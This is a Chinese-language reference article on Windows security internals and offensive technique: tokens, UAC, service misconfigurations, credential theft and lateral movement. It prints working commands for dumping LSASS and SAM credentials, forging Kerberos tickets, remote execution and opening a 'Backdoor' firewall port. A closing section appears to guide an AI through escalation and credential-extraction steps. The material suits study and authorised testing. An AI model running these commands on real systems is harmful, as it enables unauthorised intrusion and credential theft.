# Windows 安全原理 — 权限模型、Token、进程安全与服务攻击面

> Level 0: 基础原理 / OS 内核
> 前置知识：Linux 权限模型 (02-process-permission-security.md)
> 适用场景：Windows 系统渗透、本地提权、横向移动、凭据窃取

---

## 一、Windows 安全架构

### 1.1 安全主体

```
┌─────────────────────────────────────────────────────────────┐
│                    Windows 安全主体                           │
│                                                             │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌────────────┐ │
│  │  用户    │  │  组      │  │  计算机   │  │  服务      │ │
│  │ (User SID)│  │ (Group   │  │ (Computer │  │ (Service   │ │
│  │          │  │  SID)    │  │   SID)    │  │   SID)    │ │
│  └──────────┘  └──────────┘  └──────────┘  └────────────┘ │
│                                                             │
│  每个安全主体有唯一 SID（安全标识符）                          │
│  SID = S-1-5-21-<Domain>-<RID>                              │
│  常见 RID: 500=Administrator, 501=Guest, 502=KRBTGT,        │
│            512=Domain Admins, 513=Domain Users               │
└─────────────────────────────────────────────────────────────┘
```

### 1.2 访问令牌 (Access Token)

**每个进程/线程都有一个关联的访问令牌**

```
访问令牌结构：
┌────────────────────────────────────────────────────┐
│ 令牌 (Token)                                        │
│ ├── 用户 SID                                        │
│ ├── 组 SID 列表 (包含用户所属的所有组)                 │
│ ├── 特权列表 (Privileges)                            │
│ │   ├── SeTcbPrivilege (作为操作系统)                │
│ │   ├── SeDebugPrivilege (调试进程)                   │
│ │   ├── SeTakeOwnershipPrivilege (取得所有权)        │
│ │   ├── SeBackupPrivilege (备份文件和目录)            │
│ │   ├── SeRestorePrivilege (恢复文件和目录)           │
│ │   ├── SeLoadDriverPrivilege (加载/卸载驱动)        │
│ │   ├── SeImpersonatePrivilege (模拟用户)            │
│ │   └── SeAssignPrimaryTokenPrivilege (分配主令牌)   │
│ ├── 模拟级别 (Impersonation Level)                   │
│ │   ├── SecurityAnonymous                           │
│ │   ├── SecurityIdentification                      │
│ │   ├── SecurityImpersonation                       │
│ │   └── SecurityDelegation                           │
│ ├── 完整性级别 (Integrity Level)                     │
│ │   ├── SYSTEM (0x3000)                              │
│ │   ├── HIGH (0x2800) [管理员]                       │
│ │   ├── MEDIUM (0x2000) [普通用户]                   │
│ │   ├── MEDIUM_PLUS (0x2100) [UIPI 绕过？]           │
│ │   ├── LOW (0x1000) [沙箱]                         │
│ │   └── UNTRUSTED (0x0000)                           │
│ └── 其他属性                                          │
└────────────────────────────────────────────────────┘
```

**关键概念：**
- `SeImpersonatePrivilege` — 拥有此权限=间接 SYSTEM（利用 RoguePotato/JuicyPotato）
- `SeDebugPrivilege` — 拥有此权限可注入任何进程（包括 SYSTEM 进程）
- `SeTakeOwnershipPrivilege` — 可修改任何对象 ACL
- 完整性级别：低不能访问高（UIPI — 用户界面特权隔离）

### 1.3 UAC (用户账户控制)

```
┌─────────────────────────────────────────────┐
│ 管理员登录 → 分配 2 个令牌                      │
│                                              │
│  用户令牌 (Filtered)          完全管理员令牌    │
│  ┌─────────────────┐     ┌─────────────────┐ │
│  │ Administrator   │     │ Administrator   │ │
│  │ MEDIUM Integrity│     │ HIGH Integrity  │ │
│  │ 移除部分特权     │     │ 全部特权        │ │
│  └─────────────────┘     └─────────────────┘ │
│                                              │
│ UI 默认使用 Filtered Token                    │
│ 需要管理员权限时触发 Consent Prompt            │
└─────────────────────────────────────────────┘
```

**UAC 绕过原理：** 找到以 HIGH 完整性运行的自动提升程序（如 `fodhelper.exe`、`computerdefaults.exe`）→ 修改注册表使其执行恶意命令

---

## 二、进程安全与注入

### 2.1 进程保护机制

| 机制 | 描述 | 绕过 |
|:----|:-----|:----|
| **PPL (Protected Process Light)** | 防终止、防注入（如 LSASS、反病毒） | 需要内核驱动或特定签名 |
| **Credential Guard** | 基于虚拟化的隔离（VBS） | LSASS 中无明文密码（需内存转储攻击） |
| **LSA 保护** | 防止 LSASS 不被调试/注入 | 注册表 RunAsPPL 可解除 |
| **CFG (控制流防护)** | 防止 ROP/JOP | 需绕过 CFG bitmap |
| **ACL 保护** | 限制谁可打开/读取进程 | 需要 SeDebugPrivilege |

### 2.2 进程注入技术

| 技术 | 原理 | 检测难度 |
|:----|:-----|:--------:|
| **Classic DLL Injection** | `CreateRemoteThread` + `LoadLibrary` | 低 |
| **Process Hollowing** | 替换合法进程的内存 | 中 |
| **Reflective DLL Injection** | 从内存加载 DLL 不走磁盘 | 中 |
| **APC Injection** | 使用异步过程调用 | 中 |
| **Thread Hijacking** | 劫持现有线程 | 中 |
| **AtomBombing** | 利用全局原子表 | 高 |
| **Propagate** | 利用进程间共享内存 | 高 |

---

## 三、服务安全

### 3.1 服务权限配置

```powershell
# 检查服务权限
sc.exe sdshow <ServiceName>
# 输出示例: D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
# 解码:
# SY = SYSTEM (本地系统)
# BA = BUILTIN_ADMINISTRATORS
# IU = INTERACTIVE_USER (交互用户)
```

**不安全的服务配置：**
```
D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)
   (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
   (A;;CCLCSWRPWPDTLOCRRC;;;IU)
   (A;;RPWPCR;;;AU)                    ← Authenticated Users 可写服务
```

**服务漏洞利用：**
```powershell
# 1. 服务路径空格 (Unquoted Service Path)
sc.exe qc <ServiceName>
# 如果路径包含空格且没有引号 → 可替换中间路径

# 2. 服务二进制权限过弱 (Weak Service Binary Permissions)
icacls "C:\Program Files\Vulnerable Service\service.exe"
# 如果 Authenticated Users 有 Write 权限 → 替换二进制文件

# 3. 服务权限过弱 (Weak Service ACL)
# 如果用户有 SERVICE_CHANGE_CONFIG → 改 BinPath 到恶意程序

# 4. 服务注册表权限
# HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
# 如果用户有写注册表 → 修改 ImagePath
```

### 3.2 常见提权服务漏洞

| 漏洞类型 | 检测方法 | 工具 |
|:---------|:--------|:----|
| **Unquoted Service Path** | `wmic service get name,pathname` | PowerUp |
| **Weak Service Permission** | `Get-ServiceAcl -Name *` | PowerUp |
| **Weak Binary Permission** | `icacls <binary>` | PowerUp |
| **AlwaysInstallElevated** | 注册表键存在 | PowerUp |
| **Modifiable Registry** | 服务注册表键可写 | PowerUp |
| **Modifiable Schedule Task** | 任务可被修改 | SchTask Abuse |
| **Modifiable DLL Hijack** | 路径中可写文件夹 | ProcMon |

---

## 四、凭据窃取技术

### 4.1 LSASS 凭据提取

```
LSASS.EXE (C:\Windows\System32\lsass.exe)
├── 已登录用户的 NTLM Hash
├── Kerberos TGT (登录会话)
├── 明文密码 (如果启用 WDigest)
├── 缓存的域凭据 (Cache)
└── DPAPI Master Keys

提取方法：
① Mimikatz: sekurlsa::logonpasswords (需要 SeDebugPrivilege)
② 内存转储: procdump.exe -ma lsass.exe lsass.dmp
③ 卷影副本: vssadmin 复制 SYSTEM hive
④ 注册表: reg save HKLM\SYSTEM SYSTEM.hive
```

### 4.2 SAM 数据库提取

```
SAM (安全账户管理器)
├── 本地用户密码的 NTLM Hash
├── 用 SYSKEY (Boot Key) 加密
└── 需要 SYSTEM hive + SAM hive

提取步骤：
① reg save HKLM\SAM SAM.hive
② reg save HKLM\SYSTEM SYSTEM.hive
③ impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
```

### 4.3 DPAPI 破解

```
DPAPI 主密钥 (Master Key)
├── 用于保护 Chrome/Edge 密码、RDP 凭据等
├── 用用户密码 + SID 保护
└── 位于 %APPDATA%\Microsoft\Protect\{SID}\\

破解:
① 获取主密钥文件 + 用户密码/SID
② mimikatz dpapi::masterkey /in:FILE /sid:SID /password:Password
③ 获得主密钥 → 解密 Chrome 密码
```

### 4.4 其他凭据存储

| 位置 | 内容 | 提取方法 |
|:-----|:-----|:--------|
| `%APPDATA%\Microsoft\Credentials\` | RDP/其他凭据 | mimikatz dpapi::cred |
| `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data` | Chrome 保存的密码 | SQLite 读取 + DPAPI 解密 |
| `%USERPROFILE%\AppData\Local\Microsoft\Credentials\` | Windows 凭据管理器 | cmdkey /list |
| `C:\Windows\System32\config\SAM` | 本地用户 Hash | reg save + secretsdump |
| `NTDS.DIT` | 域用户 Hash | secretsdump -just-dc |

---

## 五、Windows 内网横向移动

### 5.1 横向移动技术对比

| 技术 | 端口 | 认证方式 | 特征 |
|:----|:---:|:--------|:----|
| **SMB Exec** | 445 | NTLM / Kerberos | 通过 ADMIN$ IPC 创建服务 |
| **WMI Exec** | 135/RPC | NTLM / Kerberos | 通过 WMI 创建进程 |
| **WinRM** | 5985/5986 | Kerberos / NTLM | HTTP/HTTPS，需要 WinRM 启用 |
| **PSExec** | 445 | NTLM | 写入 ADMIN$ → 创建服务 |
| **DCOM** | 135 | NTLM / Kerberos | 通过 COM 远程创建对象 |
| **SchTask** | 445 | NTLM | 创建计划任务 |
| **RDP** | 3389 | NTLM / Kerberos | 需要交互式登录 |

### 5.2 防火墙绕过

```powershell
# 常见的防火墙绕过方法
# 1. WinRM (5985/5986) — 许多企业已启用
# 2. WMI (135) → AD 环境默认开放
# 3. SMB (445) → 文件共享必须
# 4. RPC (动态端口范围 49152-65535) → 难封锁
# 5. SSH (22) → 如果安装了 OpenSSH
# 6. HTTP/HTTPS (80/443) — 走 Web 通道
# 7. 创建防火墙规则
netsh advfirewall firewall add rule name="Backdoor" dir=in action=allow protocol=TCP localport=4444
```

---

## 六、常用攻击工具

### 6.1 Windows 环境

```powershell
# Mimikatz
sekurlsa::logonpasswords               # 提取登录会话凭据
lsadump::dcsync /domain:DOMAIN /user:krbtgt  # DCSync
token::elevate                          # Token 提权
kerberos::golden /user:admin /domain:DOMAIN /sid:SID /krbtgt:HASH  # 黄金票据

# PowerUp
Get-ServiceUnquoted                    # 检测未引号服务路径
Get-ModifiableServiceFile              # 检测可修改的服务二进制
Get-ModifiableService                  # 检测可修改的服务配置
Invoke-ServiceAbuse -Name VulnSvc      # 利用服务提权

# PowerView
Get-NetSession -ComputerName Server1   # 查看谁登录了服务器
Invoke-UserHunter                     # 找管理员登录的机器
Find-LocalAdminAccess                 # 当前用户有本地管理员权限的机器

# WinPEAS
.\winpeas.exe                          # 自动检测本地提权路径
```

### 6.2 Linux 远程

```bash
# impacket
impacket-smbexec DOMAIN/user:pass@TARGET
impacket-wmiexec DOMAIN/user:pass@TARGET
impacket-psexec DOMAIN/user:pass@TARGET
impacket-dcomexec DOMAIN/user:pass@TARGET
impacket-secretsdump DOMAIN/user:pass@DC -just-dc

# CrackMapExec / NetExec
cme smb 192.168.1.0/24 -u user -p pass --shares
nxc smb 192.168.1.0/24 -u user -H LM:NT --local-auth
```

---

## 七、LLM 推理辅助

### 触发条件
- "Windows"、"提权"、"Token"、"LSASS"、"SAM"
- "Mimikatz"、"服务漏洞"、"UAC"、"凭据"
- "SeDebugPrivilege"、"SeImpersonate"、"PPL"
- "横向移动"、"WMI"、"WinRM"、"SMB"

### 检测信号表
| 信号 | 含义 | 置信度 |
|:----|:-----|:------:|
| 服务路径包含空格且无引号 | Unquoted Service Path | 高 |
| 服务二进制文件 Authenticated Users 可写 | Weak Binary Permission | 极高 |
| 注册表项 AlwaysInstallElevated = 1 | MSI 提权 | 极高 |
| LSASS 以 PPL 模式运行 | 需要驱动绕过或特定方法 | 中 |
| Token 包含 SeImpersonatePrivilege | Potato 系列攻击 | 高 |
| Token 的 Integrity Level = MEDIUM | 需要 UAC 绕过 | 中 |
| 服务配置用户有 SERVICE_CHANGE_CONFIG | 可改服务二进制路径 | 极高 |

### 验证步骤
1. 检查当前用户 Token → 权限、完整性级别、组关系
2. 运行 WinPEAS 或 PowerUp 扫描本地提权路径
3. 检查服务配置 → Unquoted Path、Weak ACL、Weak Binary
4. 检查 AlwaysInstallElevated 注册表
5. 检查是否有 SeImpersonatePrivilege（Potato 类攻击）
6. 尝试提取 LSASS 凭据（如果有管理员权限）

### 利用链扩展
- SeImpersonatePrivilege → RoguePotato → SYSTEM → DCSync
- UAC 绕过 → 管理员 → LSASS 提取 → Hash → 横向移动
- 服务漏洞 → SYSTEM → LSASS dump → 域凭据 → BloodHound
- SeDebugPrivilege → 注入 SYSTEM 进程 → 凭据提取

### 关联攻击面
- [Linux 权限模型](02-process-permission-security.md) → 与 Windows Token 模型对比
- [Kerberos 安全](../network/06-kerberos-security.md) → 域认证基础
- [NTLM 安全](../network/07-ntlm-security.md) → 本地/网络认证
- [AD 域安全](../network/08-active-directory-security.md) → 域提权路径

### 常见误判
- SeImpersonatePrivilege 存在 ≠ 立刻能提权（需要触发特定服务的模拟）
- AlwaysInstallElevated 只在 MSI 安装时有效
- UAC 绕过仅在本地交互式登录时有效
- 服务路径有空格 ≠ 可利用（需要 SYSTEM 执行该服务）
- 管理员权限 ≠ 能提取所有用户的凭据（有些用户已注销）
